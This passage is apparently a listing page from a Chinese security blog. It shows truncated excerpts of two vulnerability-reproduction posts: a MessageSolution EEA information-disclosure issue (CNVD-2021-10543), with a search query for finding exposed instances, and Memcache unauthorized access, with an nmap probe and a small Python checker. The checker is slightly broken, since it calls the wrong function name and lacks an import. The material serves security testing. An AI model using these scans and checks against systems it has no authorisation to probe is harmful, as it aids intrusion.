<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title=<span class="string">&quot;MessageSolution Enterprise Email Archiving (EEA)&quot;</span></span><br></pre></td></tr></table></figure>

<p>登录页面如下</p>
<p>![](/resource/MessageSolution邮件归档系统EEA信息泄露漏洞CNVD-2021-10543/media/1.png)</p>
<p>访问如下Url</p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/MessageSolution/MessageSolution%20%E9%82%AE%E4%BB%B6%E5%BD%92%E6%A1%A3%E7%B3%BB%E7%BB%9FEEA%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CNVD-2021-10543/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/MessageSolution/MessageSolution%20%E9%82%AE%E4%BB%B6%E5%BD%92%E6%A1%A3%E7%B3%BB%E7%BB%9FEEA%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CNVD-2021-10543/" data-id="cl5c2qrs400ary8v1as1w5vw9" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Memcache/Memcache未授权访问" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Memcache/Memcache%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" class="article-date">
  <time datetime="2022-07-08T06:25:59.204Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Memcache未授权访问"><a href="#Memcache未授权访问" class="headerlink" title="Memcache未授权访问"></a>Memcache未授权访问</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><blockquote>
<p>memcached是一套分布式的高速缓存系统。它以Key-Value（键值对）形式将数据存储在内存中，这些数据通常是应用读取频繁的。正因为内存中数据的读取远远大于硬盘，因此可以用来加速应用的访问。</p>
</blockquote>
<h2 id="二、影响范围"><a href="#二、影响范围" class="headerlink" title="二、影响范围"></a>二、影响范围</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h4 id="1-扫描探测"><a href="#1-扫描探测" class="headerlink" title="1.扫描探测"></a>1.扫描探测</h4><pre><code>nmap -sV -p 11211 --script memcached-info 0.0.0.0
</code></pre>
<p><img src="/resource/Memcache%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/media/rId25.png"></p>
<pre><code>##! /usr/bin/env python
## _*_  coding:utf-8 _*_
def Memcache_check(ip, port=11211, timeout=5):
    try:
        socket.setdefaulttimeout(timeout)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, int(port)))
        s.send(&quot;stats\r\n&quot;)
        result = s.recv(1024)
        if &quot;STAT version&quot; in result:
            print &#39;[+] Memcache Unauthorized: &#39; +ip+&#39;:&#39;+str(port)
    except Exception, e:
        pass
if __name__ == &#39;__main__&#39;:
    Elasticsearch_check(&quot;127.0.0.1&quot;)
</code></pre>
<h4 id="2-攻击利用"><a href="#2-攻击利用" class="headerlink" title="2.攻击利用"></a>2.攻击利用</h4>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Memcache/Memcache%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Memcache/Memcache%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" data-id="cl5c2qrs500aty8v1bos01qoc" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  
  
    <nav id="page-nav">
      <a class="extend prev" rel="prev" href="/page/61/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/60/">60</a><a class="page-number" href="/page/61/">61</a><span class="page-number current">62</span><a class="page-number" href="/page/63/">63</a><a class="page-number" href="/page/64/">64</a><span class="space">&hellip;</span><a class="page-number" href="/page/101/">101</a><a class="extend next" rel="next" href="/page/63/">下一页</a>
    </nav>
  
</section>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2022 She11c0de<br>
      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <!--
      <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">首页</a>
  
    <a href="/categories/life" class="mobile-nav-link">生活</a>
  
    <a href="/archives" class="mobile-nav-link">归档</a>
  
</nav>
    -->
    

<!-- 百度分享 start -->

<!-- 百度分享 end -->

<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>




<script src="/js/jquery.scrollUp.min.js"></script>


<script src="/js/jquery.transform.js"></script>


<script src="/js/menu.js"></script>



<script src="/js/script.js"></script>


<script src="/js/scrollUp.js"></script>


  </div>
</body>
</html>